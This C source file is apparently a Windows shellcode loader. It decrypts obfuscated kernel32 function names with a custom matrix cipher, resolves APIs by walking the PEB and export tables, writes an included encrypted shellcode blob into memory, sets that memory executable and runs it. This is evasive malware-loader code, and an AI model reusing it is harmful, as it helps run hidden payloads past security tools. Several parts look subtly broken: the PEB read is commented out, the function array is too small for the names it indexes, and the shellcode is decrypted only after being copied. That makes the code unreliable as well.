#include <windows.h>
#include <winternl.h>

// clang --target=i686-pc-windows-gnu "-Wl,--entry=__start" -nostartfiles -nostdlib filepath.c -g -o  thisisthefilemyman.exe

// The variables and prototypes necessary for decryption

#define NUM_ROWS (4)
#define NUM_COLUMNS (4)

const int key_matrix_inverse[NUM_ROWS][NUM_COLUMNS] = {
    {124, 188, 152, 99}, 
    {60, 88, 23, 36}, 
    {163, 98, 190, 170},
    {220, 89, 88, 9}
};

int data_matrix[NUM_ROWS][NUM_COLUMNS] = {0};
int last_matrix[NUM_ROWS][NUM_COLUMNS] = {0};
int tmp_matrix[NUM_ROWS][NUM_COLUMNS] = {0};

const int iv_length = 16;

void decrypt_data(char *src, DWORD size);

// Variables to load kernel32.dll and use its functions

#define GET_PROC_ADDRESS_INDEX (0)
#define LOAD_LIBRARY_A_INDEX (1)
#define GET_MODULE_HANDLE_A_INDEX (2)
#define VIRTUAL_ALLOC_INDEX (3)
#define VIRTUAL_PROTECT_INDEX (4)
#define HEAP_FREE_INDEX (5)
#define HEAP_ALLOC_INDEX (6)
#define GET_PROCESS_HEAP_INDEX (7)
#define WRITE_FILE_INDEX (8)
#define GET_STD_HANDLE_INDEX (9)
#define VIRTUAL_FREE_INDEX (10)
#define CREATE_FILE_A_INDEX (11)
#define CLOSE_HANDLE_INDEX (12)

PPEB peb_windows_structure = NULL;
void *kernel_library_address = NULL;
int number_kernel_library_functions = 11;
void *kernel_library_function_addresses[11] = {};
char encrypted_kernel_library_name[] = "\xbb\x3c\xf2\x31\x79\x1b\x07\x59\xb9\x85\x63\xce\xa7\x98\x80\x94\x1d\xb4\x4b\x16\x17\x7f\x34\x68\x24\x4b\xfc\x9a\xba\x54\x40\xa2\x04\x2a\x3d\xc4\x8a\x5f\x5b\x48\x04\x32\x1c\x2d\x94\xaa\x60\xd8";
int size_encrypted_kernel_library_name = 48;
const wchar_t *kernel_library_name = NULL;
// expected order is 'GetProcAddress\x00LoadLibraryA\x00GetModuleHandleA\x00VirtualAlloc\x00VirtualProtect\x00HeapFree\x00HeapAlloc\x00GetProcessHeap\x00WriteFile\x00GetStdHandle\x00VirtualFree\x00CreateFileA\x00CloseHandle'.encode('ascii') + b'\x00'
char encrypted_kernel_library_function_names[] = "\xa0\x96\x48\xdc\xc3\x48\x76\x39\x35\xc3\x72\x08\xc5\xd2\x0f\x34\xc6\x7d\x46\x6d\x7a\xb7\x02\x14\xac\xe8\xf0\x49\xad\x21\x90\x29\xa6\xa3\x20\xbe\x65\xae\xe0\x68\x2a\x2f\x1b\x53\x04\x3c\x28\x1c\x62\x38\xf8\xcf\xdd\x81\xd7\x7b\x07\xb6\xc3\x5b\xd4\x6b\x22\x22\xfd\x3a\x15\x4d\xbe\x65\x6b\x36\xbe\x6d\xb9\x06\xd4\xf9\x5c\xd7\xcf\x3e\xa2\xa2\x9d\x16\xc1\x8b\xd0\xc8\xd7\x31\x95\x52\x4e\x93\x12\x45\xcb\x78\x94\x56\x0b\x17\xb0\x24\x29\x79\x88\x4e\x6c\xe7\x8e\x73\x63\x22\xde\xe3\x0c\x3e\x38\x93\x08\xfe\xf1\xb8\x78\x93\x04\xe0\x6f\x7e\x4d\x85\xa1\x27\x79\x14\xa2\x39\x47\xa0\x66\xda\xff\xf1\xee\x41\x70\x1f\xc1\x76\x6c\x4b\x3b\x63\x78\x1e\x3e\xe2";
int size_encrypted_kernel_library_function_names = 160;
const char *kernel_library_function_names = NULL;

// START C STANDARD LIBRARY REPLACEMENT

// replacement_string - compare strings
int replacement_string(const char *s1, const char *s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return (unsigned char)*s1 - (unsigned char)*s2;
}

// replacement_memcpy - copy memory
void *replacement_memcpy(void *dest, const void *src, size_t n) {
    unsigned char *d = (unsigned char *)dest;
    const unsigned char *s = (const unsigned char *)src;
    while (n--) {
        *d++ = *s++;
    }
    return dest;
}

// replacement_memset - set memory
void *replacement_memset(void *s, int c, size_t n) {
    unsigned char *p = (unsigned char *)s;
    while (n--) {
        *p++ = (unsigned char)c;
    }
    return s;
}


void *replacement_malloc(size_t size) {
    return ((LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD)) kernel_library_function_addresses[VIRTUAL_ALLOC_INDEX])(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

void replacement_free(void *ptr) {
    if (ptr) {
        ((BOOL (__stdcall *)(LPVOID, SIZE_T, DWORD)) kernel_library_function_addresses[VIRTUAL_FREE_INDEX])(ptr, 0, MEM_RELEASE);
    }
}

int wcs_equals(const wchar_t *s1, const wchar_t *s2) {
    while (*s1 == *s2) {
        if (*s1 == 0) return 1;  // match
        s1++;
        s2++;
    }
    return 0;  // no match
}

int compare_file_name(const wchar_t *path, const wchar_t *name){
    const wchar_t *basename = path;
    while((* basename) != 0){
	basename++;
    }
    while((* basename) != L'\\'){
	basename--;
    }
    basename++;
    return wcs_equals(basename, name);
}

const wchar_t *get_library_by_number(const wchar_t *buffer, int n){
    const wchar_t *current = buffer;
    for(int i = 0; i < n; i++){
     	while((*current) != 0){
	    current++;
	}
    	current++;
    }
    return current;
}

const char *get_function_by_number(const char *buffer, int n){
    const char *current = buffer;
    for(int i = 0; i < n; i++){
	while((*current) != '\x00'){
	    current++;
        }
	current++;
    }
    return current;
}

void *get_module_address(PPEB process_env_block, const wchar_t *module_name){
    LIST_ENTRY *linked_list_head = &(process_env_block->Ldr->InMemoryOrderModuleList);
    LIST_ENTRY *current_module = linked_list_head->Flink;
    while(current_module != linked_list_head){
    	PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY) (((BYTE *) current_module) - (sizeof(PVOID) * 2));
	if(entry->FullDllName.Buffer != NULL && compare_file_name(entry->FullDllName.Buffer, module_name)){
	    return entry->DllBase;
	}
    	current_module = current_module->Flink;
    }
    return NULL;
}

void *get_function_address(void *module_address, const char *function_name){
    IMAGE_DOS_HEADER *dos_header = (IMAGE_DOS_HEADER *) module_address;
    IMAGE_NT_HEADERS *nt_headers = (IMAGE_NT_HEADERS *) (((BYTE *) module_address) + dos_header->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *export_directory = (IMAGE_EXPORT_DIRECTORY *) (((BYTE *) module_address) + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names_exported = (DWORD *) (((BYTE *) module_address) + export_directory->AddressOfNames);
    WORD  *ordinals = (WORD *) (((BYTE *) module_address) + export_directory->AddressOfNameOrdinals);
    DWORD *function_address_array = (DWORD*)(((BYTE *) module_address) + export_directory->AddressOfFunctions);
    
    for (DWORD i = 0; i < export_directory->NumberOfNames; i++) {
        const char *function_in_module = (const char *) (((BYTE *) module_address) + names_exported[i]);
        if (replacement_string(function_in_module, function_name) == 0) {
            WORD selected_ordinal = ordinals[i];
            return (((BYTE *) module_address) + function_address_array[selected_ordinal]);
        }
    }
    return NULL;    
}

void init_kernel_library(void){
    decrypt_data(encrypted_kernel_library_name, size_encrypted_kernel_library_name);
    decrypt_data(encrypted_kernel_library_function_names, size_encrypted_kernel_library_function_names);
    
    kernel_library_name = (const wchar_t *) (encrypted_kernel_library_name + iv_length);
    kernel_library_function_names = encrypted_kernel_library_function_names + iv_length;
     
    //__asm__("movl %%fs:0x30, %0" : "=r"(peb_windows_structure));
    kernel_library_address = get_module_address(peb_windows_structure, kernel_library_name);
    for(int i = 0; i < number_kernel_library_functions; i++){
	const char *function_name = get_function_by_number(kernel_library_function_names, i);
        kernel_library_function_addresses[i] = get_function_address(kernel_library_address, function_name);
    }

}

// #include "crypto_interface.h"
void matrix_xor(int (*matrix_1)[NUM_COLUMNS], int (*matrix_2)[NUM_COLUMNS], int (*matrix_result)[NUM_COLUMNS]){
    for(int i = 0; i < NUM_ROWS; i++)
        for(int j = 0; j < NUM_COLUMNS; j++)
            matrix_result[i][j] = matrix_1[i][j] ^ matrix_2[i][j];
}

void matrix_mul(int (*matrix_1)[NUM_COLUMNS], int (*matrix_2)[NUM_COLUMNS], int (*matrix_result)[NUM_COLUMNS]){
    for(int i = 0; i < NUM_ROWS; i++)
        for(int j = 0; j < NUM_COLUMNS; j++){
            matrix_result[i][j] = 0;
            for(int k = 0; k < NUM_ROWS; k++)
                matrix_result[i][j] += matrix_1[i][k] * matrix_2[k][j];
            matrix_result[i][j] %= 256;
        }
}

void array_add(char *dest, char *adder){
    for(int i = 0; i < 16; i++){
        dest[i] = (dest[i] + adder[i]) % 256;
    }
}

void decrypt_data(char* src, DWORD size) {
    int num_multiplications = size / 16;
    int bytes_remaining = size % 16;

    for(int i = 0; i < num_multiplications - 1; i++){
        array_add(src + (i * 16), src + ((num_multiplications - 1) * 16));
    }

    for(int i = 0; i < num_multiplications; i++){
        for(int k = 4 * i; k < ((i + 1) * 4); k++)
            for(int j = k * 4; j < ((k+1) * 4); j++)
                data_matrix[k % 4][j % 4] = (unsigned char) src[j];
        
        matrix_mul(data_matrix, (int (*)[NUM_COLUMNS]) key_matrix_inverse, tmp_matrix);
        
        if(i != 0)
            matrix_xor(tmp_matrix, last_matrix, tmp_matrix);

        for(int j = 0; j < NUM_ROWS; j++)
            for(int k = 0; k < NUM_COLUMNS; k++)
                last_matrix[j][k] = data_matrix[j][k];

        for(int k = i * 4; k < (i+1) * 4; k++)
            for(int j = k * 4; j < (k+1) * 4; j++)
                src[j] = tmp_matrix[(j % 16) / 4][(j % 16) % 4];
    }
    
    for(int i = 0; i < (bytes_remaining/4) + 1; i++){
        int j_range = 4;
        if(i == (bytes_remaining / 4))
            j_range = bytes_remaining % 4;
        for(int j = 0; j < j_range; j++)
            src[(size - (size % 16)) + (i * 4) + j] ^= last_matrix[i][j];
    }
}

// Shellcode handling code 

#include "shellcode_file.h"

void *shellcode_handling_load(char *shellcode_to_load, int shellcode_to_load_size){
    // Reserve memory, copy contents and change protections
    void *reserved_memory = (void *) ((LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD)) kernel_library_function_addresses[VIRTUAL_ALLOC_INDEX])(NULL,(SIZE_T) shellcode_to_load_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    replacement_memcpy(reserved_memory, shellcode_to_load, shellcode_to_load_size);
    DWORD oldProtect;
    (((BOOL (__stdcall *)(LPVOID, DWORD, DWORD, DWORD*)) kernel_library_function_addresses[VIRTUAL_PROTECT_INDEX]) ((LPVOID) reserved_memory, (DWORD) shellcode_to_load_size, PAGE_EXECUTE_READ, &oldProtect));
    return reserved_memory;    
}

void shellcode_handling_execute(void *shellcode_address){
    void (*execute_entry_point)(void) = (void(*)()) shellcode_address;
    execute_entry_point();
}

// MAIN
void print_minimal(void) {
    const char *msg = "Hello from minimal printf";
    
    // Assuming GetStdHandle and WriteFile are in kernel_library_function_addresses
    HANDLE stdout_handle = ((HANDLE (__stdcall *)(DWORD)) kernel_library_function_addresses[9])(-11);
    DWORD written;
    ((BOOL (__stdcall *)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED)) kernel_library_function_addresses[8])(stdout_handle, (void*)msg, 26, &written, NULL);
}

#include <windows.h>

void write_to_file(void) {
    HANDLE hFile;
    DWORD bytesWritten;
    const char data[] = "Hello from kernel32!\n";
    
    hFile = ((HANDLE (__stdcall *)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE)) kernel_library_function_addresses[CREATE_FILE_A_INDEX])("output.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
   
    ((BOOL (__stdcall *)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED)) kernel_library_function_addresses[WRITE_FILE_INDEX]) (hFile, data, sizeof(data) - 1, &bytesWritten, NULL);
   
    ((BOOL (__stdcall *)(HANDLE)) kernel_library_function_addresses[CLOSE_HANDLE_INDEX])(hFile);
}

int main(void) {   
    init_kernel_library();
    print_minimal();
    void *placed_shellcode = shellcode_handling_load(shellcode_to_execute, sizeof(shellcode_to_execute));
    if(placed_shellcode == NULL){
	return -1;
    }
    print_minimal();
    decrypt_data(shellcode_to_execute, sizeof(shellcode_to_execute));
    print_minimal();
    shellcode_handling_execute(placed_shellcode + iv_length);
    return 0;
}

